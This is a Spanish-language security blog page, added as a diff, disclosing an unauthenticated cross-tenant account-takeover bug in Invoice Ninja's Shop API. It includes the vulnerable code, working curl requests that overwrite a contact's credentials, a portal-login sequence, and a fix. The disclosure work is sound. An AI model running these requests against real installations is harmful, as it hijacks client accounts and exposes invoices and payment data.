@@ -1,0 +1,187 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Invoice Ninja: BOLA en Shop API con toma de cuenta | ZsZsec</title>
+  <meta name="description" content="Investigación local sobre una BOLA no autenticada en la Shop API de Invoice Ninja que permitía tomar la identidad y credenciales de ClientContact." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/invoice-ninja-shop-api-bola-client-contact-takeover.html" />
+  <meta property="og:title" content="Invoice Ninja: BOLA en Shop API con toma de cuenta" />
+  <meta property="og:description" content="Investigación sobre una BOLA no autenticada en la Shop API de Invoice Ninja con toma de cuenta." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/invoice-ninja-shop-api-bola-client-contact-takeover.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Invoice Ninja: BOLA en Shop API con toma de cuenta" />
+  <meta name="twitter:description" content="BOLA no autenticada en la Shop API de Invoice Ninja con toma de cuenta." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">security research / invoice ninja</p>
+      <h1>Shop API BOLA to account takeover<span>_</span></h1>
+      <div class="writeup-meta"><span>Critical</span><span>BOLA / Account takeover</span><span>No response</span></div>
+      <div class="tag-row"><span class="tag">Invoice Ninja</span><span class="tag">BOLA</span><span class="tag">Account Takeover</span><span class="tag">Multi-tenant</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <blockquote><p><strong>Alcance:</strong> toda la validación se realizó contra un despliegue Docker local de la release oficial <code>invoiceninja-5-stable</code>, sin utilizar instancias de producción ni datos de terceros. El maintainer no respondió al reporte y no se asignó CVE.</p></blockquote>
+
+        <p>Durante la revisión de Invoice Ninja encontré una BOLA (Broken Object Level Authorization) no autenticada en la Shop API pública. El fallo permitía tomar la identidad y las credenciales de cualquier contacto de cliente cuyo ID hash pudiera obtenerse, incluso entre compañías distintas dentro de la misma instalación.</p>
+
+        <p>Confirmé que las credenciales modificadas permitían iniciar una sesión real y autenticada en el portal de clientes como la víctima original. El único requisito de la petición era un <code>company_key</code> válido, una clave no secreta diseñada para aparecer en el JavaScript público de un widget de tienda.</p>
+
+        <h2>Ficha técnica</h2>
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>Invoice Ninja</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/invoiceninja/invoiceninja" target="_blank" rel="noopener noreferrer">github.com/invoiceninja/invoiceninja</a></td></tr>
+            <tr><td>Reporte enviado</td><td>4 de agosto de 2026</td></tr>
+            <tr><td>Versión probada</td><td><code>v5.13.24</code></td></tr>
+            <tr><td>Componente</td><td>Shop API</td></tr>
+            <tr><td>Endpoint</td><td><code>POST /api/v1/shop/clients</code></td></tr>
+            <tr><td>Autenticación</td><td>No requerida</td></tr>
+            <tr><td>Requisito</td><td>Company key público de una compañía controlada por el atacante</td></tr>
+            <tr><td>Vulnerabilidad</td><td>BOLA / cross-tenant account takeover</td></tr>
+            <tr><td>CVSS 3.1</td><td>9.4 Critical</td></tr>
+            <tr><td>Vector</td><td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L</code></td></tr>
+            <tr><td>Estado</td><td>No response / sin CVE asignado</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Resumen del flujo vulnerable</h2>
+        <p>La ruta de creación pública estaba protegida únicamente por el flag <code>enable_shop_api</code> de la compañía y el header <code>X-API-COMPANY-KEY</code>:</p>
+        <pre><code>POST /api/v1/shop/clients
+X-API-COMPANY-KEY: &lt;company_key&gt;</code></pre>
+
+        <p>El endpoint aceptaba un ID existente dentro de <code>contacts[].id</code>. La validación bloqueaba un ID numérico directo, pero decodificaba y conservaba una versión string:</p>
+        <pre><code>if (is_numeric($contact['id'])) {
+    unset($input['contacts'][$key]['id']);
+} elseif (is_string($contact['id'])) {
+    $input['contacts'][$key]['id'] = $this-&gt;decodePrimaryKey($contact['id']);
+}</code></pre>
+
+        <p>Ese valor llegaba a <code>ClientContactRepository::save()</code>, donde se cargaba el contacto mediante un <code>find()</code> sin scope de compañía ni de cliente:</p>
+        <pre><code>$update_contact = ClientContact::find($contact['id']);
+...
+$update_contact-&gt;client_id = $client-&gt;id;
+$update_contact-&gt;fill($contact);
+$update_contact-&gt;password = Hash::make($contact['password']);
+$update_contact-&gt;save();</code></pre>
+
+        <p>El resultado era una cadena de operaciones sobre un registro existente:</p>
+        <pre><code>client_contact_id controlado
+        ↓
+decodificación del ID hash
+        ↓
+ClientContact::find() sin scope
+        ↓
+sobrescritura de email, nombre y password
+        ↓
+reassign de client_id al cliente recién creado
+        ↓
+credenciales válidas del contacto víctima</code></pre>
+
+        <h2>Por qué cruzaba compañías</h2>
+        <p>El salt de Hashids, configurado mediante <code>config('ninja.hash_salt')</code>, es global para toda la instalación y no está separado por compañía. Por tanto, un ID de contacto de cualquier compañía puede decodificarse y resolverse desde otra compañía cuando el atacante conoce su propio <code>company_key</code>.</p>
+
+        <p><code>company_id</code> no es fillable en <code>ClientContact</code>, por lo que permanece el identificador de la víctima. Sin embargo, <code>client_id</code> se mueve al cliente creado por el atacante. El resultado es una referencia entre tenants: el contacto sigue asociado a la compañía víctima, pero apunta a un cliente controlado desde la compañía del atacante.</p>
+
+        <h2>Comparación con el endpoint seguro</h2>
+        <p>El endpoint hermano <code>Shop\ClientController::show()</code> realiza correctamente la consulta anónima:</p>
+        <pre><code>GET /api/v1/shop/client/{contact_key}</code></pre>
+
+        <p>Esta ruta utiliza <code>contact_key</code>, un token opaco diferente, y limita la consulta mediante <code>company_id</code>. En el mismo controlador coexistían dos caminos para el mismo caso de uso: uno correctamente aislado y otro que reutilizaba lógica de validación y repositorio del API autenticado sin aplicar el límite de tenant.</p>
+
+        <h2>Descubrimiento del ID</h2>
+        <p>Una posible fuente del ID de contacto era:</p>
+        <pre><code>GET /api/v1/shop/invoice/{invitation_key}</code></pre>
+
+        <p><code>Shop\InvoiceController::show()</code> utilizaba <code>InvoiceTransformer</code>, que incluía por defecto las invitaciones de la factura. Cada entrada de invitación exponía un <code>client_contact_id</code> codificado junto con su propia clave, incluyendo invitaciones distintas de la solicitada.</p>
+
+        <p>Este era solo un camino de descubrimiento. Cualquier <code>client_contact_id</code> válido funciona independientemente de cómo se haya obtenido. Además, cuando <code>HASH_SALT</code> queda sin definir, el salt puede caer en una cadena vacía y los Hashids de las claves primarias se vuelven predecibles o precomputables offline.</p>
+
+        <h2>Prueba de concepto local</h2>
+        <p>Todos los ejemplos utilizan valores sintéticos y el host <code>TARGET</code> representa únicamente el despliegue local de prueba.</p>
+
+        <h3>1. Toma de cuenta dentro de una compañía</h3>
+        <pre><code>curl -s -X POST http://TARGET/api/v1/shop/clients \
+  -H "X-API-COMPANY-KEY: &lt;company_key&gt;" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"poc",
+    "contacts":[{
+      "id":"&lt;existing_contact_hashid&gt;",
+      "first_name":"x",
+      "last_name":"y",
+      "email":"attacker@example.com",
+      "password":"AttackerPass123"
+    }]
+  }'</code></pre>
+        <p>La respuesta fue <code>HTTP 200</code>. El contacto existente tenía su email, nombre y password sobrescritos, y su <code>client_id</code> era reasignado al cliente recién creado.</p>
+
+        <h3>2. Toma de cuenta cross-company</h3>
+        <pre><code>curl -s -X POST http://TARGET/api/v1/shop/clients \
+  -H "X-API-COMPANY-KEY: &lt;company_A_key&gt;" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"poc",
+    "contacts":[{
+      "id":"&lt;company_B_contact_hashid&gt;",
+      "first_name":"x",
+      "last_name":"y",
+      "email":"hijacked@example.com",
+      "password":"HijackedPass123"
+    }]
+  }'</code></pre>
+        <p>La compañía B resultó comprometida utilizando únicamente la clave de la compañía A. La base de datos confirmó que <code>contact.company_id</code> seguía apuntando a B, mientras <code>contact.client_id</code> apuntaba a un cliente propiedad de A.</p>
+
+        <h3>3. Sesión del portal con las credenciales modificadas</h3>
+        <pre><code>curl -c jar.txt http://TARGET/client/login -o login.html
+TOKEN=$(grep -oP 'name="_token" value="\K[^"]+' login.html)
+
+curl -b jar.txt -c jar.txt -X POST http://TARGET/client/login \
+  --data-urlencode "_token=$TOKEN" \
+  --data-urlencode "email=hijacked@example.com" \
+  --data-urlencode "password=HijackedPass123"
+
+curl -b jar.txt http://TARGET/client/invoices</code></pre>
+
+        <p>La respuesta fue <code>200</code> y la sesión quedó autenticada. El portal devolvió el nombre del contacto original y su enlace de perfil real, confirmando que no se trataba únicamente de una modificación de datos sino de una sesión como la víctima.</p>
+
+        <h2>Impacto</h2>
+        <p>Un atacante podía tomar cualquier contacto de cliente cuyo ID obtuviera, sin autenticarse más allá de una clave de widget pública. La explotación fue confirmada tanto dentro de una compañía como entre dos compañías no relacionadas en una instalación self-hosted con una sola base de datos.</p>
+
+        <p>Una vez modificadas las credenciales, el atacante obtenía acceso autenticado al portal del contacto víctima. Dependiendo de los datos asociados, esto podía exponer facturas, métodos de pago, documentos y estados de cuenta.</p>
+
+        <p>En Invoice Ninja Cloud, el pre requisito de controlar una compañía puede ser trivial si está habilitado el registro. En self-hosted, el endpoint <code>/api/v1/signup</code> bloquea el registro mediante <code>CreateAccountRequest::authorize()</code> cuando no se trata de una instalación hosted, por lo que el atacante necesita controlar previamente una compañía en la instalación objetivo.</p>
+
+        <h2>Corrección sugerida</h2>
+        <p>En <code>StoreShopClientRequest::prepareForValidation()</code> debería eliminarse por completo la rama <code>elseif</code>. Este endpoint crea un cliente nuevo mediante <code>ClientFactory::create()</code>, por lo que nunca debería decodificar ni conservar un <code>contacts[].id</code> existente.</p>
+
+        <p>Como defensa en profundidad, <code>ClientContactRepository::save()</code> debería aplicar scope de <code>company_id</code> y/o <code>client_id</code> en lugar de utilizar una búsqueda por clave primaria sin restricciones:</p>
+        <pre><code>// No usar un lookup global para un contacto controlado por entrada externa.
+ClientContact::where('company_id', $companyId)
+    -&gt;where('client_id', $clientId)
+    -&gt;find($contactId);</code></pre>
+
+        <h2>Estado</h2>
+        <p>El hallazgo fue reportado siguiendo el proceso indicado en <code>SECURITY.md</code>. El maintainer no respondió y no se asignó CVE. La investigación queda publicada aquí, con datos sintéticos y sin referencias a una instancia de producción.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
